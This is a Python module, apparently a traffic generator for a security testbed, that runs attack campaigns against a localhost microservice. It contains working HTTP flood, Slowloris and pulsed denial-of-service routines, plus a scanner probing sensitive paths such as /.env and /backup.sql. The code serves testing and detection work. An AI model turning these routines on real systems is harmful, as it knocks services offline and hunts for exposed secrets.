"""
Confined Attacker Module for Stage 3 Testbed
STRICT CONFINEMENT: Exclusively targets http://127.0.0.1:<port> (local testbed microservice).
Never makes outbound or external network requests.
"""

import time
import socket
import random
import threading
import requests
from typing import Dict, Any

class ConfinedAttacker:
    def __init__(self, target_host: str = "127.0.0.1", target_port: int = 8088):
        # Strict security assertion: must be loopback localhost
        assert target_host in ["127.0.0.1", "localhost"], f"Security violation: target_host must be local ({target_host})"
        self.target_host = target_host
        self.target_port = target_port
        self.base_url = f"http://{target_host}:{target_port}"

    def run_volumetric_flood(self, duration_sec: float, intensity: float = 5.0):
        """High-rate GET/POST volumetric flood overwhelming HTTP parser and service."""
        stop_time = time.time() + duration_sec
        endpoints = ["/api/catalog?limit=100", "/api/search?q=Component", "/api/checkout"]

        def worker():
            s = requests.Session()
            while time.time() < stop_time:
                ep = random.choice(endpoints)
                try:
                    if ep == "/api/checkout":
                        s.post(f"{self.base_url}{ep}", json={"items": [{"id": 1, "qty": 100}]}, timeout=0.5)
                    else:
                        s.get(f"{self.base_url}{ep}", timeout=0.5)
                except Exception:
                    pass

        threads = [threading.Thread(target=worker, daemon=True) for _ in range(int(8 * intensity))]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def run_slowloris(self, duration_sec: float, intensity: float = 1.2):
        """Slowloris: opens multiple sockets and sends partial headers slowly to exhaust active connection pool."""
        stop_time = time.time() + duration_sec
        sockets = []
        n_sockets = int(30 * intensity)

        for _ in range(n_sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((self.target_host, self.target_port))
                s.send(f"GET /api/catalog HTTP/1.1\r\nHost: {self.target_host}\r\nUser-Agent: Mozilla/5.0\r\n".encode("utf-8"))
                sockets.append(s)
            except Exception:
                pass

        while time.time() < stop_time and sockets:
            for s in list(sockets):
                try:
                    s.send(f"X-Slow-Header-{random.randint(1, 1000)}: {random.randint(1, 1000)}\r\n".encode("utf-8"))
                except Exception:
                    try:
                        s.close()
                    except Exception:
                        pass
                    sockets.remove(s)
            time.sleep(0.1)

        for s in sockets:
            try:
                s.close()
            except Exception:
                pass

    def run_intermittent_spike(self, duration_sec: float, intensity: float = 4.0):
        """Intermittent pulse attack: bursts for 0.4s, rests for 0.4s."""
        stop_time = time.time() + duration_sec
        while time.time() < stop_time:
            self.run_volumetric_flood(duration_sec=min(0.4, stop_time - time.time()), intensity=intensity)
            time.sleep(0.4)

    def run_endpoint_recon(self, duration_sec: float, intensity: float = 3.0):
        """Vulnerability & directory reconnaissance scanning triggering 404/400 errors."""
        stop_time = time.time() + duration_sec
        recon_paths = [
            "/admin", "/.env", "/config.json", "/wp-login.php", "/api/v1/debug",
            "/server-status", "/actuator/health", "/api/catalog/99999", "/backup.sql"
        ]

        def worker():
            s = requests.Session()
            while time.time() < stop_time:
                path = random.choice(recon_paths)
                try:
                    s.get(f"{self.base_url}{path}", timeout=0.5)
                except Exception:
                    pass

        threads = [threading.Thread(target=worker, daemon=True) for _ in range(int(4 * intensity))]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def run_flash_crowd(self, duration_sec: float, intensity: float = 4.0):
        """Benign Flash Crowd: High volume of valid catalog requests with 200 OK (Label = 0)."""
        stop_time = time.time() + duration_sec

        def worker():
            s = requests.Session()
            while time.time() < stop_time:
                try:
                    s.get(f"{self.base_url}/api/catalog?limit=20", timeout=0.5)
                except Exception:
                    pass

        threads = [threading.Thread(target=worker, daemon=True) for _ in range(int(6 * intensity))]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def execute_campaign(self, campaign: Dict[str, Any], window_duration_sec: float):
        """Executes a single campaign according to its specification."""
        c_type = campaign["type"]
        intensity = campaign.get("intensity", 3.0)

        if c_type == "volumetric_flood":
            self.run_volumetric_flood(duration_sec=window_duration_sec, intensity=intensity)
        elif c_type == "slowloris":
            self.run_slowloris(duration_sec=window_duration_sec, intensity=intensity)
        elif c_type == "intermittent_spike":
            self.run_intermittent_spike(duration_sec=window_duration_sec, intensity=intensity)
        elif c_type == "endpoint_recon":
            self.run_endpoint_recon(duration_sec=window_duration_sec, intensity=intensity)
        elif c_type == "flash_crowd":
            self.run_flash_crowd(duration_sec=window_duration_sec, intensity=intensity)
